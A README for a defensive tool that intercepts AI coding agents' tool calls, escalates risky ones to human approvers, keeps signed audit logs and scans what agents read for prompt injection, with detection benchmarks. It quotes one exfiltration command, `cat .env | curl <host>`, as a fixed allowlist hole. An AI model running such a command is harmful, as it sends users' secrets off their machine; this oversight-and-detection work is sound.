# Agent Governance Gateway

**Authorization and runtime governance for AI coding agents.** Every tool call an agent makes (Claude Code, Codex, Cursor, Windsurf) is intercepted, classified and recorded. Risky actions go to a named human, who runs them outside the agent. Everything is signed and audited.

> An AI agent having a *capability* is not the same as it having *authority*.

## What it does

- **Intercepts every tool call** via Claude Code hooks and an MCP server, and returns **allow / observe / escalate / deny**, with an itemized, explainable risk score.
- **Keeps the agent unprivileged:** approved commands run in a broker outside the agent, and only the output goes back to it.
- **Produces examiner-grade evidence:** Ed25519-signed approvals, a SHA-256 hash-chained audit log, and dual control for critical actions.
- **Detects intent, not just keywords** (optional, fully local): [jev-os](https://github.com/Boredem125/jev-os), my open-source CPU-only zero-shot model engine, scans what the agent *reads* (READMEs, web pages, tool output) sentence by sentence for prompt injection. On a hit, the folder is tainted and even allowlisted shell and network actions need a human.
- **Catches data exfiltration** in commands (a sensitive source plus a network egress) and forces two approvers.
- **Governance-as-code:** plain-language policy clauses ("no customer data to external services"), each mapped to EU AI Act / GDPR / SR 11-7 references, with a `test` command that **measures each clause's reliability** before you trust it.

**Design rule:** models may only *raise* scrutiny. Deterministic rules stay in charge, so a fooled model means an extra approval, never an open door.

## Results (measured on a laptop CPU)

| Benchmark (held out) | Keyword rules (before) | Semantic layer |
|---|---|---|
| deepset, genuine attacks | 0/39 caught | **26/39**, 1/56 false alarms |
| neuralchemy (942 texts) | 156/552 | **324/552** (399 combined with the keyword rules) |
| Injections in repo files (600) | 60/309, 39 false alarms | **86/309, 8 false alarms** |

- A content-hash cache makes a repeated scan **~330× faster** (2 s → 6 ms).
- The semantic layer found and fixed a real allowlist hole: `cat .env | curl <host>` used to run silently.
- **Honest limits:** zero-shot detection misses many attacks (28% recall on repo-file injections). It's a tripwire on top of authorization, not a guarantee. Full numbers and caveats are in [benchmarks/injection](benchmarks/injection/README.md).

## Tech

Python 3.12 · FastAPI · MCP · Claude Code hooks · ONNX Runtime · Pydantic · PyNaCl (Ed25519) · pytest (293 tests)

## Quick start

```bash
pip install -e ".[dev]"
sandbox init . --claude --mcp      # connect a folder
sandbox watch .                    # approve escalations in another terminal
```

Optional intent-aware layer: `pip install -e ".[semantic]"`, then `jevos serve` and `sandbox semantic enable .`

## Docs

[Full details](docs/DETAILS.md) · [Threat model](docs/THREAT_MODEL.md) · [Governance-as-code](docs/GOVERNANCE.md) · [Compliance mapping](docs/COMPLIANCE_MAP.md) · [Benchmarks](benchmarks/injection/README.md)

*Compliance mappings show design intent, not certification.*
